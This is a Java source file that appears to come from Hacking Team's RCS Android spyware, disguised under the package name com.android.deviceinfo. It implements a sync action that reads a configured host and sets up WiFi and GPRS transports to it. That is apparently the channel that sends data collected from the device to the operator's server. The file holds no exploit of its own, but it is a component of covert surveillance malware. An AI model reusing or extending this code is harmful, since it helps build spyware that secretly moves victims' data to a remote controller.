/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncActionInternet.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action;

import com.android.deviceinfo.action.sync.GprsTransport;
import com.android.deviceinfo.action.sync.WifiTransport;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;

/**
 * The Class SyncActionInternet.
 */
public class SyncActionInternet extends SyncAction {

	private static final String TAG = "SyncActionInternet"; //$NON-NLS-1$

	/** The wifi forced. */
	protected boolean wifiForced;

	/** The wifi. */
	protected boolean wifi;

	/** The gprs. */
	protected boolean gprs;

	/** The host. */
	String host;

	/**
	 * Instantiates a new sync action internet.
	 * 
	 * @param params
	 *            the conf params
	 */
	public SyncActionInternet(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
	 */
	@Override
	protected boolean parse(final ConfAction params) {
		try {
			host = StringUtils.unspace(params.getString("host"));
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED, host is missing"); //$NON-NLS-1$
			}

			return false;
		}

		try {
			gprs = params.getBoolean("cell");
			wifi = params.getBoolean("wifi");
			wifiForced = wifi;
			
			
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params using default values"); //$NON-NLS-1$
			}

			gprs = false;
			wifi = true;
			wifiForced = wifi;
		}
		
		if (Cfg.DEBUG) {
			final StringBuffer sb = new StringBuffer();
			sb.append("gprs: " + gprs); //$NON-NLS-1$
			sb.append(" wifi: " + wifi); //$NON-NLS-1$
			sb.append(" stop: " + considerStop()); //$NON-NLS-1$
			sb.append(" host: " + host); //$NON-NLS-1$
			Check.log(TAG + sb.toString());//$NON-NLS-1$
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#initTransport()
	 */
	@Override
	protected boolean initTransport() {
		transports.clear();

		if (Cfg.DEBUG) {
			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
		}

		transports.addElement(new WifiTransport(host, wifiForced));

		if (gprs) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
			}

			transports.addElement(new GprsTransport(host));
		}

		return true;
	}

}
